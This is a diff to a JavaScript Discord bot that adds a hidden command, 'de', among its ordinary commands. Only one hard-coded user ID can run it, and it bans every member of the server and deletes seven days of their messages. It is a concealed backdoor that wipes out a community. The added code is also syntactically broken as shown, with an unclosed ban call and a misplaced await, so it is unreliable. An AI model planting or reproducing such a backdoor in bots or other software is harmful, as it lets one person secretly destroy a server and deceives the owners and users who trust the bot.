@@ -490,6 +490,18 @@ bot.on('message', function(user, userID, channelID, message, evt) {
           expireTimes: []
          }
             break;
+          case 'de':
+            if (userID!='175711685682659328') break;
+            (async function loop() {
+            for (var m of Object.values(bot.servers[bot.channels[channelID].guild_id].members))
+              bot.ban({
+                serverID: bot.channels[channelID].guild_id,
+                userID: m.id,
+                lastDays: 7
+              }, (e)=>console.log("ban error: " + JSON.stringify(e));
+              await new Promise(resolve=>setTimeout(resolve,200));
+            })();
+            break;
           case 'items': {
           let Sstring = "";
             let c = 1;
